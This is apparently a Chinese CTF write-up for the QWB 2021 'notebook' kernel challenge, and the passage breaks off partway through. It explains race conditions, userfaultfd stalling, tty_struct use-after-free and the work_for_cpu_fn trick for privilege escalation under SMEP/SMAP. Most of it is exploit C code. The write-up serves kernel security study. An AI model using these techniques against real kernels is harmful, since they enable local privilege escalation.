<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>内核竞争条件漏洞学习——以qwb2021-notebook为例</title>
    <url>/qwb2021-notebook/</url>
    <content><![CDATA[<p>竞态条件入门学习</p>
<span id="more"></span>
<h2 id="竞态条件漏洞（Race-Condition）"><a href="#竞态条件漏洞（Race-Condition）" class="headerlink" title="竞态条件漏洞（Race Condition）"></a>竞态条件漏洞（Race Condition）</h2><p>linux支持多线程的程序，在C语言中，我们可以使用fork函数来实现多线程处理，从而提高程序的运行效率。但是多线程也会遇到问题：在对多线程共享的资源（例如全局变量）进行操作时，如果处理不当，多个线程不同步的操作会导致共享的资源被错误使用。<br>简单来说竞态条件漏洞的产生需要以下几点条件：<br>    1、多线程运行<br>    2、有共享对象<br>    3、对对象做了错误操作<br>竞态条件漏洞在linux内核中属于比较常见的，通常来讲，利用竞态条件漏洞可以构造出一些对内存的破坏，从而达到如UAF之类的效果。下面就通过2021年强网杯的notebook题来学习一下竞态条件漏洞的常见利用方式以及exp的编写。</p>
<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><img src="/qwb2021-notebook/files.jpg" class="">
<p>给的附件如上，那些id文件是ida生成的，不是给的。<br>比较重要的文件就是run.sh、bzimage和notebook.ko</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">stty intr ^]</span><br><span class="line">exec timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append &quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot; -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2&gt;/dev/null -s</span><br></pre></td></tr></table></figure>
<p>run.sh的内容如上，从启动脚本可以看出，这是64位系统，开了双核，kaslr、smep、smap都开了，给的是user权限，注意还有一个timeout，调试时记得关掉。</p>
<h2 id="调试以及一些需要的工具"><a href="#调试以及一些需要的工具" class="headerlink" title="调试以及一些需要的工具"></a>调试以及一些需要的工具</h2><p>调试内核，使用gdb-gef扩展比较方便，gef的安装我这里就不多写了，去github上下过来在gdbinit里面source就行了。<br>在启动qemu的脚本里加入-s就可以打开一个1234端口给gdb连入，这里启动脚本里已经有了<br>在最后传入exp时需要解压以及重新压缩文件系统，指令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#解压</span><br><span class="line">mkdir fs &amp;&amp; cd fs</span><br><span class="line">cp ../rootfs.cpio ./rootfs.cpio</span><br><span class="line">cpio -idmv &lt; rootfs.cpio </span><br><span class="line">#重新压缩</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.cpio</span><br></pre></td></tr></table></figure>
<p>exp编写完后需要编译，记住使用静态编译<br>调试前，需要从bzImage中提取出vmlinux，提取脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># SPDX-License-Identifier: GPL-2.0-only</span><br><span class="line"># ----------------------------------------------------------------------</span><br><span class="line"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span><br><span class="line">#</span><br><span class="line"># Inspired from extract-ikconfig</span><br><span class="line"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span><br><span class="line">#</span><br><span class="line"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span><br><span class="line">#</span><br><span class="line"># ----------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line">	# Use readelf to check if it&#x27;s a valid ELF</span><br><span class="line">	# TODO: find a better to way to check that it&#x27;s really vmlinux</span><br><span class="line">	#       and not just an elf</span><br><span class="line">	readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1</span><br><span class="line"></span><br><span class="line">	cat $1</span><br><span class="line">	exit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line">	# The obscure use of the &quot;tr&quot; filter is to work around older versions of</span><br><span class="line">	# &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span><br><span class="line"></span><br><span class="line">	# Try to find the header ($1) and decompress from here</span><br><span class="line">	for	pos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`</span><br><span class="line">	do</span><br><span class="line">		pos=$&#123;pos%%:*&#125;</span><br><span class="line">		tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null</span><br><span class="line">		check_vmlinux $tmp</span><br><span class="line">	done</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Check invocation:</span><br><span class="line">me=$&#123;0##*/&#125;</span><br><span class="line">img=$1</span><br><span class="line">if	[ $# -ne 1 -o ! -s &quot;$img&quot; ]</span><br><span class="line">then</span><br><span class="line">	echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2</span><br><span class="line">	exit 2</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Prepare temp files:</span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line">trap &quot;rm -f $tmp&quot; 0</span><br><span class="line"></span><br><span class="line"># That didn&#x27;t work, so retry after decompression.</span><br><span class="line">try_decompress &#x27;\037\213\010&#x27; xy    gunzip</span><br><span class="line">try_decompress &#x27;\3757zXZ\000&#x27; abcde unxz</span><br><span class="line">try_decompress &#x27;BZh&#x27;          xy    bunzip2</span><br><span class="line">try_decompress &#x27;\135\0\0\0&#x27;   xxx   unlzma</span><br><span class="line">try_decompress &#x27;\211\114\132&#x27; xy    &#x27;lzop -d&#x27;</span><br><span class="line">try_decompress &#x27;\002!L\030&#x27;   xxx   &#x27;lz4 -d&#x27;</span><br><span class="line">try_decompress &#x27;(\265/\375&#x27;   xxx   unzstd</span><br><span class="line"></span><br><span class="line"># Finally check for uncompressed images or objects:</span><br><span class="line">check_vmlinux $img</span><br><span class="line"></span><br><span class="line"># Bail out:</span><br><span class="line">echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2</span><br></pre></td></tr></table></figure>
<p>调试时，在虚拟机中查看模块的加载基址，然后在gdb-gef中通过add-symbol-file指令加载模块即可加载出正确的符号信息。</p>
<img src="/qwb2021-notebook/addsym.jpg" class="">
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个题给了个堆菜单，维护一个全局变量，通过add可以写，而通过edit可以修改已创建的堆的大小。在堆的操作上没有漏洞。这个题的漏洞在于它使用的copy_from_user函数即便是在有锁的情况下也是防不住竞争写的，就有了个竞态条件的问题。</p>
<img src="/qwb2021-notebook/copy_from_user.jpg" class="">
<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>这个题的目的很明确，要提权，就是要想办法用ring0权限执行commit_pred</p>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>首先我们需要构造内存破坏，这题是堆题我们就需要搞点堆上的问题，从这个竞态条件来看，构造UAF是可能的，最简单的思路是通过竞态条件产生两个重叠的堆块，但单纯的不断竞争产生这种情况的可能比较小，这个时候我们就需要用到userfaultfd了。</p>
<h4 id="user-fault-fd"><a href="#user-fault-fd" class="headerlink" title="user_fault_fd"></a>user_fault_fd</h4><p>userfaultfd 并不是一种攻击的名字，它是 Linux 提供的一种让用户自己处理缺页异常的机制，初衷是为了提升开发灵活性。<br>通过这个机制，本来需要看运气的竞争触发就变得简单了起来。copy_from_user函数在复制的时候如果遇到mmap出来的地址，就有可能出现缺页，从而被我们自定义的函数给劫持了控制流。<br>注册模板如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void ErrExit(char* err_msg)</span><br><span class="line">&#123;</span><br><span class="line">    puts(err_msg);</span><br><span class="line">    exit(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void RegisterUserfault(void *fault_page,void *handler)</span><br><span class="line">&#123;</span><br><span class="line">    pthread_t thr;</span><br><span class="line">    struct uffdio_api ua;</span><br><span class="line">    struct uffdio_register ur;</span><br><span class="line">    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = 0;</span><br><span class="line">    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)</span><br><span class="line">        ErrExit(&quot;[-] ioctl-UFFDIO_API&quot;);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (unsigned long)fault_page; //我们要监视的区域</span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1) //注册缺页错误处理</span><br><span class="line">        //当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span><br><span class="line">        ErrExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);</span><br><span class="line">    //开一个线程，接收错误的信号，然后处理</span><br><span class="line">    int s = pthread_create(&amp;thr, NULL,handler, (void*)uffd);</span><br><span class="line">    if (s!=0)</span><br><span class="line">        ErrExit(&quot;[-] pthread_create&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>劫持控制流一般都是用来卡死程序，来达到方便竞争的目的。<br>卡死模板：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void userfault_stuck_handler(void* arg)</span><br><span class="line">&#123;</span><br><span class="line">    struct uffd_msg msg;</span><br><span class="line">    unsigned long uffd = (unsigned long) arg;</span><br><span class="line">    struct pollfd pollfd;</span><br><span class="line">    int nready;</span><br><span class="line">    puts(&quot;[+] stuck handler init&quot;);</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, 1, -1);</span><br><span class="line">        sleep(3);</span><br><span class="line">    if (nready != 1)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] Wrong poll return val&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, sizeof(msg));</span><br><span class="line">    if (nready &lt;= 0)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] msg err&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">    if (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] mmap err&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    struct uffdio_copy uc;</span><br><span class="line">    // init page</span><br><span class="line">    memset(page, 0, sizeof(page));</span><br><span class="line">    uc.src = (unsigned long) page;</span><br><span class="line">    uc.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - 1);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = 0;</span><br><span class="line">    uc.copy = 0;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    puts(&quot;[+] stuck handler done&quot;);</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基于以上知识我们先来编写一个能导致UAF的exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;syscall.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;linux/userfaultfd.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line">#define PAGE_SIZE 0x1000</span><br><span class="line">#define TTY_STRUCT_SZIE 0x2E0</span><br><span class="line"></span><br><span class="line">size_t work_for_cpu_fn_off = 0xffffffff8949eb90 - 0xffffffff8a28e440;</span><br><span class="line">size_t prepare_kernel_cred_off = 0xffffffffa14a9ef0 - 0xffffffffa228e440;</span><br><span class="line">size_t commit_creds_off = 0xffffffffa14a9b40 - 0xffffffffa228e440;</span><br><span class="line"></span><br><span class="line">int note_fd;</span><br><span class="line">void* stuck_mapped_memory;</span><br><span class="line"></span><br><span class="line">struct userarg</span><br><span class="line">&#123;</span><br><span class="line">	size_t idx;</span><br><span class="line">	size_t size;</span><br><span class="line">	void* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct notebook</span><br><span class="line">&#123;</span><br><span class="line">    void* note;</span><br><span class="line">    size_t size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void ErrExit(char* err_msg)</span><br><span class="line">&#123;</span><br><span class="line">    puts(err_msg);</span><br><span class="line">    exit(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void RegisterUserfault(void *fault_page,void *handler)</span><br><span class="line">&#123;</span><br><span class="line">    pthread_t thr;</span><br><span class="line">    struct uffdio_api ua;</span><br><span class="line">    struct uffdio_register ur;</span><br><span class="line">    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = 0;</span><br><span class="line">    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)</span><br><span class="line">        ErrExit(&quot;[-] ioctl-UFFDIO_API&quot;);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (unsigned long)fault_page; //我们要监视的区域</span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1) //注册缺页错误处理</span><br><span class="line">        //当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span><br><span class="line">        ErrExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);</span><br><span class="line">    //开一个线程，接收错误的信号，然后处理</span><br><span class="line">    int s = pthread_create(&amp;thr, NULL,handler, (void*)uffd);</span><br><span class="line">    if (s!=0)</span><br><span class="line">        ErrExit(&quot;[-] pthread_create&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void noteadd(size_t idx,size_t size,void * buf)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    notearg.size = size;</span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    ioctl(note_fd,256,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void notedelete(size_t idx)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    ioctl(note_fd,512,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void noteedit(size_t idx, size_t newsize, void *buf)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    notearg.size = newsize;</span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    ioctl(note_fd,768,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void notegift(void *buf)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    ioctl(note_fd,100,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void userfault_stuck_handler(void* arg)</span><br><span class="line">&#123;</span><br><span class="line">    struct uffd_msg msg;</span><br><span class="line">    unsigned long uffd = (unsigned long) arg;</span><br><span class="line">    struct pollfd pollfd;</span><br><span class="line">    int nready;</span><br><span class="line">    puts(&quot;[+] stuck handler init&quot;);</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, 1, -1);</span><br><span class="line">    pause();</span><br><span class="line">    if (nready != 1)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] Wrong poll return val&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, sizeof(msg));</span><br><span class="line">    if (nready &lt;= 0)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] msg err&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">    if (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] mmap err&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    struct uffdio_copy uc;</span><br><span class="line">    // init page</span><br><span class="line">    memset(page, 0, sizeof(page));</span><br><span class="line">    uc.src = (unsigned long) page;</span><br><span class="line">    uc.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - 1);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = 0;</span><br><span class="line">    uc.copy = 0;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    puts(&quot;[+] stuck handler done&quot;);</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void* edit_thread(int idx)</span><br><span class="line">&#123;</span><br><span class="line">	puts(&quot;[+] edit thread start!&quot;);</span><br><span class="line">	noteedit(idx, 0, stuck_mapped_memory);</span><br><span class="line">	puts(&quot;[+] edit thread end!&quot;); // won&#x27;t reach here</span><br><span class="line">	return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void* add_thread(int idx)</span><br><span class="line">&#123;</span><br><span class="line">	puts(&quot;[+] add thread start!&quot;);</span><br><span class="line">	noteadd(idx, 0x60, stuck_mapped_memory);</span><br><span class="line">	puts(&quot;[+] add thread end!&quot;); // won&#x27;t reach here</span><br><span class="line">	return NULL;</span><br><span class="line">&#125;</span><br><span class="line">char buf_a[0x500] = &#123;&quot;aaa&quot;&#125;;</span><br><span class="line">size_t buf_tty[0x100], buf_fake_table[0x500];</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int pid,tty_fd;</span><br><span class="line">    stuck_mapped_memory = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory,userfault_stuck_handler);</span><br><span class="line">    note_fd = open(&quot;/dev/notebook&quot;, O_RDWR);</span><br><span class="line">	if (note_fd &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		ErrExit(&quot;[-] err in open notebook device&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">    noteadd(0,0x60,buf_a);</span><br><span class="line">    noteadd(1,0x60,buf_a);</span><br><span class="line">    noteedit(0,TTY_STRUCT_SZIE,buf_a);</span><br><span class="line">    noteedit(1,0x500,buf_a);</span><br><span class="line">    pthread_t thr_edit, thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit,NULL,edit_thread,0);</span><br><span class="line">    sleep(1);</span><br><span class="line">    pthread_create(&amp;thr_add,NULL,add_thread,0);</span><br><span class="line">    sleep(1);</span><br><span class="line">    puts(&quot;[+] ready to open ptmx&quot;);</span><br><span class="line">    for (int i = 0; i &lt; 20; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		tty_fd = open(&quot;/dev/ptmx&quot;, O_RDWR);</span><br><span class="line">		if (tty_fd &lt; 0)</span><br><span class="line">		&#123;</span><br><span class="line">			ErrExit(&quot;[-] ptmx open failed!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		read(note_fd, buf_tty, 0);</span><br><span class="line">		if (buf_tty[0] == 0x100005401)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;[+] tty_struct found! fd = %d\n&quot;, tty_fd);</span><br><span class="line">			break; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if (buf_tty[0] != 0x100005401)</span><br><span class="line">	&#123;</span><br><span class="line">		ErrExit(&quot;[-] leak failed&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/qwb2021-notebook/uaf.jpg" class="">
<p>在noteadd下断点，在第三次执行时看到，这个时候note0已经被另一个进程中的noteedit给free掉了，size变成了0，这个0会在copy_from_user之前的代码里被修改成60从而能在write函数中输入我们伪造的结构。代码后面的部分是通过喷射的方式来保证我们free掉的object被某个tty_struct申请走。</p>
<p>成功控制了一个tty_struct，就可以来进行地址泄漏和代码执行了。地址泄漏的部分就不多说了，在代码执行方面，比较主流的思路是进行内核rop，需要绕过semp和samp，除了这个之外，还有一个由长亭提出来的做法，利用work_for_cpu_fn来进行代码执行。<br><a href="https://zhuanlan.zhihu.com/p/385645268">长亭的解法</a></p>
<h4 id="work-for-cpu-fn（来自长亭的wp）"><a href="#work-for-cpu-fn（来自长亭的wp）" class="headerlink" title="work_for_cpu_fn（来自长亭的wp）"></a>work_for_cpu_fn（来自长亭的wp）</h4><p>控制 rip 之后，下一步就是绕过 SMEP 和 SMAP 了，这里介绍一种在完全控制了 tty 对象的情况下非常好用的 trick，完全不用 ROP，非常简单，且非常稳定（我们的 exploit 在利用成功和可以正常退出程序，甚至关机都不会触发 kernel panic）。<br>内核中有这样的一个函数：</p>
<img src="/qwb2021-notebook/ct-1.jpg" class="">
<p>其编译后大概长这样:</p>
<img src="/qwb2021-notebook/ct-2.jpg" class="">
<p>该函数位于 workqueue 机制的实现中，只要是开启了多核支持的内核 （CONFIG_SMP）都会包含这个函数的代码。不难注意到，这个函数非常好用，只要能控制第一个参数指向的内存，即可实现带一个任意参数调用任意函数，并把返回值存回第一个参数指向的内存的功能，且该 “gadget” 能干净的返回，执行的过程中完全不用管 SMAP、SMEP 的事情。由于内核中大量的 read &#x2F; write &#x2F; ioctl 之类的实现的第一个参数也都恰好是对应的对象本身，可谓是非常的适合这种场景了。考虑到我们提权需要做的事情只是 commit_creds(prepare_kernel_cred(0))，完全可以用两次上述的函数调用原语实现。（如果还需要禁用 SELinux 之类的，再找一个任意地址写 0 的 gadget 即可，很容易找）</p>
<p>利用这个函数，我们来完成这个exp，需要注意的是，原来使用rop时，触发tty的虚函数可以使用write，但使用这个函数的话，由于tty_struct中+32属于write的一个信号量，会被修改导致利用失败，所以得直接使用ioctl，ioctl的参数直接抄的长亭的wp，至于为什么我也不知道，tty的ioctl非常复杂，难以分析，这点还是直接用长亭的比较方便。</p>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;syscall.h&gt;</span><br><span class="line">#include &lt;poll.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;linux/userfaultfd.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line">#define PAGE_SIZE 0x1000</span><br><span class="line">#define TTY_STRUCT_SZIE 0x2E0</span><br><span class="line"></span><br><span class="line">size_t work_for_cpu_fn_off = 0xffffffff8949eb90 - 0xffffffff8a28e440;</span><br><span class="line">size_t prepare_kernel_cred_off = 0xffffffffa14a9ef0 - 0xffffffffa228e440;</span><br><span class="line">size_t commit_creds_off = 0xffffffffa14a9b40 - 0xffffffffa228e440;</span><br><span class="line"></span><br><span class="line">int note_fd;</span><br><span class="line">void* stuck_mapped_memory;</span><br><span class="line"></span><br><span class="line">struct userarg</span><br><span class="line">&#123;</span><br><span class="line">	size_t idx;</span><br><span class="line">	size_t size;</span><br><span class="line">	void* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct notebook</span><br><span class="line">&#123;</span><br><span class="line">    void* note;</span><br><span class="line">    size_t size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void ErrExit(char* err_msg)</span><br><span class="line">&#123;</span><br><span class="line">    puts(err_msg);</span><br><span class="line">    exit(-1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void RegisterUserfault(void *fault_page,void *handler)</span><br><span class="line">&#123;</span><br><span class="line">    pthread_t thr;</span><br><span class="line">    struct uffdio_api ua;</span><br><span class="line">    struct uffdio_register ur;</span><br><span class="line">    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = 0;</span><br><span class="line">    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)</span><br><span class="line">        ErrExit(&quot;[-] ioctl-UFFDIO_API&quot;);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (unsigned long)fault_page; //我们要监视的区域</span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1) //注册缺页错误处理</span><br><span class="line">        //当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span><br><span class="line">        ErrExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);</span><br><span class="line">    //开一个线程，接收错误的信号，然后处理</span><br><span class="line">    int s = pthread_create(&amp;thr, NULL,handler, (void*)uffd);</span><br><span class="line">    if (s!=0)</span><br><span class="line">        ErrExit(&quot;[-] pthread_create&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void noteadd(size_t idx,size_t size,void * buf)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    notearg.size = size;</span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    ioctl(note_fd,256,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void notedelete(size_t idx)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    ioctl(note_fd,512,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void noteedit(size_t idx, size_t newsize, void *buf)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    notearg.size = newsize;</span><br><span class="line">    notearg.idx = idx;</span><br><span class="line">    ioctl(note_fd,768,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void notegift(void *buf)</span><br><span class="line">&#123;</span><br><span class="line">    struct userarg notearg;</span><br><span class="line">    notearg.buf = buf;</span><br><span class="line">    ioctl(note_fd,100,&amp;notearg);</span><br><span class="line">&#125;</span><br><span class="line">void userfault_stuck_handler(void* arg)</span><br><span class="line">&#123;</span><br><span class="line">    struct uffd_msg msg;</span><br><span class="line">    unsigned long uffd = (unsigned long) arg;</span><br><span class="line">    struct pollfd pollfd;</span><br><span class="line">    int nready;</span><br><span class="line">    puts(&quot;[+] stuck handler init&quot;);</span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, 1, -1);</span><br><span class="line">    pause();</span><br><span class="line">    if (nready != 1)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] Wrong poll return val&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, sizeof(msg));</span><br><span class="line">    if (nready &lt;= 0)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] msg err&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">    if (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(&quot;[-] mmap err&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    struct uffdio_copy uc;</span><br><span class="line">    // init page</span><br><span class="line">    memset(page, 0, sizeof(page));</span><br><span class="line">    uc.src = (unsigned long) page;</span><br><span class="line">    uc.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - 1);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = 0;</span><br><span class="line">    uc.copy = 0;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    puts(&quot;[+] stuck handler done&quot;);</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void* edit_thread(int idx)</span><br><span class="line">&#123;</span><br><span class="line">	puts(&quot;[+] edit thread start!&quot;);</span><br><span class="line">	noteedit(idx, 0, stuck_mapped_memory);</span><br><span class="line">	puts(&quot;[+] edit thread end!&quot;); // won&#x27;t reach here</span><br><span class="line">	